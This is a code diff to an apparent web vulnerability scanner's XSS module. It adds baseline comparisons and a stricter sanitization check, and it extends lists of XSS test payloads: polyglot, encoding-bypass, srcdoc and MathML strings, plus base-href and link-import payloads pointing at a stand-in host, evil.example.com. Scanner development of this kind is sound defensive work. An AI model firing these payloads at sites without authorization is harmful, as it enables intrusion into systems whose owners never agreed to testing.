@@ -133,9 +133,18 @@ class XSSModule(BaseModule):
 
     def _test_csp_bypass(self, url: str, method: str, param: str, value: str):
         """Test for CSP bypass XSS"""
+        # Get baseline to compare against
+        try:
+            baseline_response = self.requester.request(url, method, data={param: value})
+            baseline_text = baseline_response.text if baseline_response else ""
+        except Exception:
+            baseline_text = ""
+
         payloads = [
             '<base href="https://evil.example.com/">',
             '{{constructor.constructor("alert(1)")()}}',
+            "<link rel=import href='https://evil.example.com/xss.html'>",
+            "<object data='javascript:alert(1)'>",
         ]
         for payload in payloads:
             try:
@@ -143,25 +152,34 @@ class XSSModule(BaseModule):
                 response = self.requester.request(url, method, data=data)
                 if not response:
                     continue
-                if payload in response.text:
-                    from core.engine import Finding
+                # Only flag if payload is reflected AND was not in baseline
+                if payload in response.text and payload not in baseline_text:
+                    if not self._is_sanitized(payload, response.text):
+                        from core.engine import Finding
 
-                    finding = Finding(
-                        technique="XSS (CSP Bypass)",
-                        url=url,
-                        severity="HIGH",
-                        confidence=0.7,
-                        param=param,
-                        payload=payload,
-                        evidence="CSP bypass payload reflected",
-                    )
-                    self.engine.add_finding(finding)
-                    return
+                        finding = Finding(
+                            technique="XSS (CSP Bypass)",
+                            url=url,
+                            severity="HIGH",
+                            confidence=0.75,
+                            param=param,
+                            payload=payload,
+                            evidence="CSP bypass payload reflected unescaped (not in baseline)",
+                        )
+                        self.engine.add_finding(finding)
+                        return
             except Exception:
                 continue
 
     def _test_polyglot(self, url: str, method: str, param: str, value: str):
         """Test for XSS with polyglot payloads"""
+        # Get baseline to filter pre-existing content
+        try:
+            baseline_response = self.requester.request(url, method, data={param: value})
+            baseline_text = baseline_response.text if baseline_response else ""
+        except Exception:
+            baseline_text = ""
+
         payloads = [
             "jaVasCript:/*-/*`/*'/*\"/**/(/* */oNcliCk=alert() )//",
             "'-alert()-'",
@@ -170,6 +188,8 @@ class XSSModule(BaseModule):
             "<img src=x onerror=alert(1)//>",
             "<video><source onerror=alert(1)>",
             "<body onpageshow=alert(1)>",
+            "<details/open/ontoggle=alert`1`>",
+            "<marquee onstart=alert(1)>",
         ]
         for payload in payloads:
             try:
@@ -177,31 +197,41 @@ class XSSModule(BaseModule):
                 response = self.requester.request(url, method, data=data)
                 if not response:
                     continue
-                if payload in response.text:
-                    from core.engine import Finding
+                if payload in response.text and payload not in baseline_text:
+                    if not self._is_sanitized(payload, response.text):
+                        from core.engine import Finding
 
-                    finding = Finding(
-                        technique="XSS (Polyglot)",
-                        url=url,
-                        severity="HIGH",
-                        confidence=0.8,
-                        param=param,
-                        payload=payload,
-                        evidence="Polyglot XSS payload reflected",
-                    )
-                    self.engine.add_finding(finding)
-                    return
+                        finding = Finding(
+                            technique="XSS (Polyglot)",
+                            url=url,
+                            severity="HIGH",
+                            confidence=0.85,
+                            param=param,
+                            payload=payload,
+                            evidence="Polyglot XSS payload reflected unescaped (not in baseline)",
+                        )
+                        self.engine.add_finding(finding)
+                        return
             except Exception:
                 continue
 
     def _test_encoding_bypass(self, url: str, method: str, param: str, value: str):
         """Test for XSS with encoding bypass payloads"""
+        # Get baseline to filter pre-existing content
+        try:
+            baseline_response = self.requester.request(url, method, data={param: value})
+            baseline_text = baseline_response.text if baseline_response else ""
+        except Exception:
+            baseline_text = ""
+
         payloads = [
             "<svg/onload=alert(1)>",  # No quotes, no spaces
             "<img src=x onerror=alert`1`>",  # Template literal
             "<svg onload=alert&lpar;1&rpar;>",  # HTML entity parentheses
             "\\u003csvg onload=alert(1)\\u003e",  # Unicode escape
             "<svg onload=&#97;&#108;&#101;&#114;&#116;(1)>",  # HTML entity function name
+            "<iframe srcdoc='<script>alert(1)</script>'>",  # srcdoc
+            "<math><mi//xlink:href='javascript:alert(1)'>",  # MathML
         ]
         for payload in payloads:
             try:
@@ -209,20 +239,21 @@ class XSSModule(BaseModule):
                 response = self.requester.request(url, method, data=data)
                 if not response:
                     continue
-                if payload in response.text:
-                    from core.engine import Finding
+                if payload in response.text and payload not in baseline_text:
+                    if not self._is_sanitized(payload, response.text):
+                        from core.engine import Finding
 
-                    finding = Finding(
-                        technique="XSS (Encoding Bypass)",
-                        url=url,
-                        severity="HIGH",
-                        confidence=0.85,
-                        param=param,
-                        payload=payload,
-                        evidence="Encoding bypass payload reflected unmodified",
-                    )
-                    self.engine.add_finding(finding)
-                    return
+                        finding = Finding(
+                            technique="XSS (Encoding Bypass)",
+                            url=url,
+                            severity="HIGH",
+                            confidence=0.85,
+                            param=param,
+                            payload=payload,
+                            evidence="Encoding bypass payload reflected unmodified (not in baseline)",
+                        )
+                        self.engine.add_finding(finding)
+                        return
             except Exception:
                 continue
 
@@ -425,26 +456,46 @@ class XSSModule(BaseModule):
                 print(f"{Colors.error(f'DOM XSS test error: {e}')}")
 
     def _is_sanitized(self, payload: str, response: str) -> bool:
-        """Check if payload was sanitized"""
-        # Check for common sanitization patterns
+        """Check if payload was sanitized in the response.
+
+        Detects common sanitization patterns including HTML entity encoding,
+        hex encoding, JS escaping, unicode escaping, and tag stripping.
+        """
+        # Check for common sanitization patterns (encoded versions of payload chars)
         sanitized_patterns = [
-            "&lt;",  # HTML entities
+            "&lt;",  # HTML entities for < >
             "&gt;",
             "&quot;",
+            "&#x27;",  # Hex entity for '
+            "&#39;",  # Decimal entity for '
             "&#x3C;",  # Hex encoding
             "&#x3E;",
             "\\x3c",  # JS escaping
             "\\x3e",
             "\\u003c",  # Unicode escaping
             "\\u003e",
+            "\\u0022",  # Unicode escaped "
+            "\\u0027",  # Unicode escaped '
         ]
 
-        for pattern in sanitized_patterns:
-            if pattern in response:
+        # Count how many sanitization indicators are present
+        sanitization_hits = sum(1 for pattern in sanitized_patterns if pattern in response)
+        if sanitization_hits >= 2:
+            return True
+
+        # Check if dangerous tags/attributes were stripped
+        dangerous_patterns = [
+            ("<script>", "<script>" not in response and "<script" in payload.lower()),
+            ("onerror=", "onerror=" not in response and "onerror=" in payload.lower()),
+            ("onload=", "onload=" not in response and "onload=" in payload.lower()),
+            ("javascript:", "javascript:" not in response and "javascript:" in payload.lower()),
+        ]
+        for _, was_stripped in dangerous_patterns:
+            if was_stripped:
                 return True
 
-        # Check if script tags were removed
-        if "<script>" in payload and "<script>" not in response:
+        # Check if angle brackets were specifically encoded
+        if "<" in payload and "&lt;" in response and "<" not in response.replace(payload, ""):
             return True
 
         return False
